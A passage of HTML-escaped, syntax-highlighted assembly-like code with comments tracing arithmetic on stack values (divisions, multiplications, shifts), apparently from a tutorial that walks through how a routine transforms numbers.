&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;228&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;66&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;286&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@if0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;CMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; %&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JNE  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@true0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154 &lt;&#x2F;span&gt;&lt;span&gt;--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MUL  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16 &lt;&#x2F;span&gt;&lt;span&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;48
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;ADD  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;48&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;49
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16 &lt;&#x2F;span&gt;&lt;span&gt;-- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;49&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SHL  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;..  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;ADD  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64 &lt;&#x2F;span&gt;&lt;span&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;67
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;67  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;67&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@if1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;228  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;.. &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;228&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;76
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;CMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; %&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JNE  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@true1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;228 &lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;227
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;227&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;75&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;666
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;228&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;114
